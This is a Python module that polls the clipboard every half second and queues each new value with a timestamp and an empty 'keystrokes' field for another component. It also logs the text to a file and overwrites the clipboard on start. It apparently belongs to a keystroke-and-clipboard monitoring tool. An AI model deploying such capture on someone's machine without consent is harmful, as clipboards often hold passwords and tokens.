import pyperclip
import time
import platform
import queue
import threading

try:
    import win32clipboard
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

clipboard_queue = queue.Queue()
latest_clipboard = ""  # For client_gui

def get_clipboard_win32():
    """Get clipboard data using win32clipboard for Windows."""
    if not WIN32_AVAILABLE:
        return None
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            return data.decode('utf-8', errors='ignore') if data else ""
        win32clipboard.CloseClipboard()
        return ""
    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Win32 clipboard error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
        return None

def monitor_clipboard():
    """Monitor clipboard and add changes to queue."""
    global latest_clipboard
    try:
        pyperclip.copy("INITIAL_CLIPBOARD_TEST")
        initial_data = pyperclip.paste()
        latest_clipboard = initial_data
        with open("error_log.txt", "a") as f:
            f.write(f"Clipboard initialized at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {initial_data}\n")
    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Clipboard init error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
    
    last_clipboard = initial_data
    while True:
        try:
            current_clipboard = pyperclip.paste() or ""
            if not current_clipboard and platform.system() == "Windows" and WIN32_AVAILABLE:
                current_clipboard = get_clipboard_win32() or ""
            
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                latest_clipboard = current_clipboard
                clipboard_queue.put({"clipboard": current_clipboard, "keystrokes": [], "timestamp": time.strftime("%Y-%m-%d_%H-%M-%S")})
                with open("error_log.txt", "a") as f:
                    f.write(f"Clipboard updated at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {current_clipboard[:50]}\n")
            time.sleep(0.5)
        except Exception as e:
            with open("error_log.txt", "a") as f:
                f.write(f"Clipboard error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
            time.sleep(2)